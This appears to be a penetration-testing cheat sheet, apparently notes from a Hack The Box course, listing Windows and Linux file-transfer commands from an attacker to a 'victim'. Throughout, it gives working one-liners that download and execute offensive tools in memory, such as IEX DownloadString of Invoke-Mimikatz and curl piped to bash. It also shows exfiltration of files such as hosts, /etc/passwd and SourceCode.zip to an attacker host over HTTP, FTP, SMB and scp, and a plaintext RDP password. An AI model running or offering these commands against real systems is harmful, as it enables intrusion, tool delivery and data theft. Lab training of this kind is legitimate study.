# Windows File Transfer Methods

## Powershell based

-   PowerShell DownloadFile Method

```powershell
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

-  PowerShell DownloadString - Fileless Method

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

-  PowerShell Invoke-WebRequest

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```


## SMB Downloads

-  Create the SMB Server

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

-  Copy a File from the SMB Server

```sh
copy \\192.168.220.133\share\nc.exe
```

-  Create the SMB Server with a Username and Password

```sh
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

-  Mount the SMB Server with Username and Password

```sh
net use n: \\192.168.220.133\share /user:test test
```

## FTP Downloads

- Setting up a Python3 FTP Server

```sh
sudo python3 -m pyftpdlib --port 21
```

- Transferring Files from an FTP Server Using PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

- or  Create a Command File for the FTP Client and Download the Target File

```sh
C:\htb> echo open 192.168.49.128 > ftpcommand.txt 
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo GET file.txt >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt 
C:\htb> ftp -v -n -s:ftpcommand.txt 
ftp> open 192.168.49.128 Log in with USER and PASS first. 
ftp> USER anonymous 
ftp> GET file.txt 
ftp> bye 
C:\htb>more file.txt This is a test file
```

## Upload Operations

-  Encode File Using PowerShell

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

## PowerShell Web Uploads

- on the attecker machine 

```sh
python3 -m uploadserver
```

- on the victim 

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

-  PowerShell Base64 Web Upload

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte)) PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

## SMB Uploads

- starting the server

```sh
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

- copping the files

```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

## FTP Uploads

- starting the upload server 

```sh
sudo python3 -m pyftpdlib --port 21 --write
```

- uploading

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

- or 

```sh
C:\htb> echo open 192.168.49.128 > ftpcommand.txt 
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt 
C:\htb> ftp -v -n -s:ftpcommand.txt 
ftp> open 192.168.49.128 Log in with USER and PASS first. 
ftp> USER anonymous 
ftp> PUT c:\windows\system32\drivers\etc\hosts 
ftp> bye
```

# Linux File Transfer Methods

## Web Downloads with Wget and cURL

-  Download a File Using wget

```sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

-  Download a File Using cURL

```sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```


## Fileless Attacks Using Linux

-  Fileless Download with cURL

```sh
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

-  Fileless Download with wget

```sh
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## Download with Bash (/dev/tcp)

-  Connect to the Target Webserver

```sh
exec 3<>/dev/tcp/10.10.10.32/80
```

-  HTTP GET Request

```sh
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

## SSH Downloads

```sh
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

## Alternative Web File Transfer Method

- php server

```sh
php -S 0.0.0.0:8000
```

- ruby shell

```sh
ruby -run -ehttpd . -p8000
```

## SCP Upload

```sh
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

# Transferring Files with Code

## Python

-  Python 2 - Download

```sh
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

-  Python 3 - Download

```sh
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## PHP

-  PHP Download with File_get_contents()

```sh
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

-  PHP Download with fopen()

```sh
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

-  PHP Download a File and Pipe it to Bash

```sh
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby

- download files

```sh
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## Perl 

- download files

```sh
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JavaScript

- create a file name `wget.js`

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send(); BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1; BinStream.Open(); 
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

-  Download a File Using JavaScript and cscript.exe

```sh
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript

- create a file `wget.vbs`

```vb
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") 
dim bStrm: Set bStrm = createobject("Adodb.Stream") 
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send 
with bStrm 
	.type = 1 
	.open 
	.write xHttp.responseBody 
	.savetofile WScript.Arguments.Item(1), 2 
end with
```

- download a file 

```sh
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## RDP

```sh
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

